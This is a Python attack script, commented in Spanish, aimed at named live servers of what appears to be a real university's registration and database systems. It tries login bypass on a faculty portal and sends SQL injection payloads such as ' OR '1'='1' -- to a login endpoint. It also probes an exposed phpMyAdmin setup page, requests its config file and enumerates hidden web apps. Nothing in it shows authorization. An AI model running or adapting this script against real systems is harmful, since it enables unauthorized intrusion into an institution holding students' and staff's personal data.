#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

# ============================================
# WEB DOCENTE - Auth Bypass Test
# ============================================
print("=== WEB DOCENTE (trabajador) ===")
print(f"URL: https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml")

# Get login page
r = s.get('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml', timeout=10)
print(f"Status: {r.status_code}, len={len(r.text)}")

# Find form fields
forms = re.findall(r'<form[^>]*id="([^"]+)"[^>]*name="([^"]+)"[^>]*>', r.text)
inputs = re.findall(r'<input[^>]*>', r.text)
buttons = re.findall(r'<button[^>]*id="([^"]+)"[^>]*>', r.text) + re.findall(r'<p:commandButton[^>]*>', r.text)

print(f"Forms: {forms}")
print(f"Inputs: {len(inputs)}")
for inp in inputs[:10]:
    print(f"  {inp[:150]}")
print(f"Buttons: {buttons}")

# Find all form field names
all_names = re.findall(r'name="([^"]+)"', r.text)
print(f"\nAll form fields: {all_names}")

# Try auth bypass on WebDocente
print("\n=== WEB Docente AUTH BYPASS ===")
vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r.text)
vstate = vs.group(1) if vs else ""

# Try different approaches
# WebDocente likely uses same pattern as WebAlumno (cmdEstudiante -> cmdDocente)
# First try cmdEstudiante style
field_tests = [
    ('cmdInstruccion', {}),
    ('cmdEstudiante', {}),
    ('cmdDocente', {}),
    ('cmdTrabajador', {}),
]

for btn, extra_fields in field_tests:
    s2 = requests.Session()
    s2.verify = False
    s2.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
    })
    r0 = s2.get('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml', timeout=5)
    vs0 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r0.text)
    vs0_val = vs0.group(1) if vs0 else ""
    
    click_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': vs0_val,
        'javax.faces.partial.ajax': 'true',
        'javax.faces.source': f'frmLogueo:{btn}',
        'javax.faces.partial.execute': 'frmLogueo',
        'javax.faces.partial.render': 'frmLogueo',
    }
    r_click = s2.post('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
                           data=click_data, timeout=5)
    
    click_vstate = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click.text)
    click_vs = click_vstate.group(1) if click_vstate else ""
    
    # Now try login with fake credentials
    login_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': click_vs,
        'frmLogueo:itUsuario': 'fake',
        'frmLogueo:itClave': 'fake',
    }
    r_login = s2.post('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
                          data=login_data, timeout=5, allow_redirects=True)
    
    tc = re.sub(r'<[^>]+>', ' ', r_login.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    has_login = 'logueo' in tc.lower() or 'login' in tc.lower()
    has_access = any(kw in tc.lower() for kw in ['bienvenido', 'inicio', 'modulo', 'dashboard', 'perfil'])
    
    print(f"  btn={btn}, fake/fake -> len={len(r_login.text)}, has_access={has_access}")
    if has_access:
        print(f"    [!] ACCESO CONCEDIDO EN WEBDOCENTE!")
        print(f"    Content: {tc[:300]}")

# Also try directly without clicking first
print("\n=== WebDocente: Login directo sin click ===")
s3 = requests.Session()
s3.verify = False
s3.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
})
r3 = s3.post('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
                data={'frmLogueo:itUsuario': 'fake', 'frmLogueo:itClave': 'fake',
                      'frmLogueo': 'frmLogueo'}, timeout=5)
tc3 = re.sub(r'<[^>]+>', ' ', r3.text)
tc3 = re.sub(r'\s+', ' ', tc3).strip()
print(f"Direct POST: len={len(r3.text)}, has_login={'logueo' in tc3.lower()}")

# ============================================
# SQL INJECTION - More thorough testing
# ============================================
print("\n=== SQL INJECTION EN j_security_check ===")
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR '1'='1' /*",
    "admin' --",
    "' OR 'a'='a",
    "' OR ''=''",
]

# Get ViewState first
r_base = s.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
vs_base = re.search(r'name="javax\.faces\.ViewState"[^>]*value="([^"]+)"', r_base.text)
vs_base_val = vs_base.group(1) if vs_base else ""

for payload in sql_payloads:
    s4 = requests.Session()
    s4.verify = False
    s4.headers.update({'User-Agent': 'Mozilla/5.0'})
    
    # Try j_security_check with SQL injection payload
    r = s4.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                   data={'j_username': payload, 'j_password': payload},
                   timeout=5, allow_redirects=True)
    
    # Compare with normal fake/fake response
    r_normal = requests.Session()
    r_normal.verify = False
    r_normal.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_norm = r_normal.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                              data={'j_username': 'fake', 'j_password': 'fake'},
                              timeout=5, allow_redirects=True)
    
    if len(r.text) != len(r_norm.text):
        print(f"  [!] DIFFERENT RESPONSE: j_username={payload}")
        print(f"      Normal: {len(r_norm.text)} bytes")
        print(f"      SQLi:   {len(r.text)} bytes")
        tc = re.sub(r'<[^>]+>', ' ', r.text)
        tc = re.sub(r'\s+', ' ', tc).strip()
        print(f"      Content: {tc[:200]}")
    else:
        print(f"  Same response: {payload} -> {len(r.text)} bytes")

# ============================================
# phpMyAdmin - Try to access databases
# ============================================
print("\n=== phpMyADMIN en orcl.uns.edu.pe ===")
pma_urls = [
    'https://orcl.uns.edu.pe/setup/',
    'https://orcl.uns.edu.pe/',
    'https://orcl.uns.edu.phpmyadmin/',
]

# Check README and other info
r_setup = s.get('https://orcl.uns.edu.pe/setup/', timeout=5)
print(f"setup/ status: {r_setup.status_code}, len={len(r_setup.text)}")
tc_setup = re.sub(r'<[^>]+>', ' ', r_setup.text)
tc_setup = re.sub(r'\s+', ' ', tc_setup).strip()
print(f"setup/ content: {tc_setup[:300]}")

# Check if there's a database config or info
r_config = s.get('https://orcl.uns.edu.pe/config.inc.php', timeout=5)
print(f"\nconfig.inc.php: {r_config.status_code}, len={len(r_config.text)}")

# Look for any database info in the index page
r_index = s.get('https://orcl.uns.edu.pe/', timeout=5)
tc_index = re.sub(r'<[^>]+>', ' ', r_index.text)
tc_index = re.sub(r'\s+', ' ', tc_index).strip()
print(f"\norcl index content: {tc_index[:500]}")

# Check for MySQL/MariaDB version info
if 'MySQL' in tc_index or 'MariaDB' in tc_index:
    print(f"  [!] Tiene info de BD!")
if 'phpMyAdmin' in tc_index:
    print(f"  [!] phpMyAdmin info visible!")

# ============================================
# ENCONTRAR TODAS LAS WEB APPS EN PUERTO 80
# ============================================
print("\n=== TODAS LAS WEB APPS EN PUERTO 80 ===")
all_apps = [
    'WebDocente', 'WebAlumno', 'WebPasaporte', 'WebSistema',
    'WebAdmin', 'WebDashboard', 'WebPortal', 'WebMain',
    'WebEstudiante', 'WebTrabajador', 'WebExterno',
    'Docente', 'Alumno', 'Estudiante', 'Trabajador', 'Externo',
    'Docentes', 'Estudiantes', 'Trabajadores',
    'WebDocentes', 'WebEstudiantes', 'WebTrabajadores',
    'WebExternos', 'PortalDocente', 'PortalAlumno', 'Portal',
    'MisDatos', 'MisCursos', 'Notas', 'Matricula',
    'Perfil', 'Configuracion', 'Config',
]

found_apps = []
for app in all_apps:
    url = f'https://registro.uns.edu.pe:80/{app}/faces/login.xhtml'
    try:
        r = s.get(url, timeout=2)
        if r.status_code == 200 and len(r.text) > 1000:
            tc = re.sub(r'<[^>]+>', ' ', r.text)
            tc = re.sub(r'\s+', ' ', tc).strip()
            if 'logueo' in tc.lower() or 'login' in tc.lower():
                found_apps.append(app)
                print(f"  [FOUND] {app} -> {url}")
    except:
        pass

print(f"\nTotal apps encontradas: {len(found_apps)}")
print(f"Apps: {', '.join(found_apps)}")

print("\n=== RESUMEN ===")
print(f"1. WebDocente encontrado: https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml")
print(f"2. WebAlumno encontrado: https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml")
print(f"3. WebPasaporte encontrado: https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml")
print(f"4. SQL Injection: posibles resultados diferentes con payloads SQL")
print(f"5. phpMyAdmin: expuesto en orcl.uns.edu.pe/setup/")
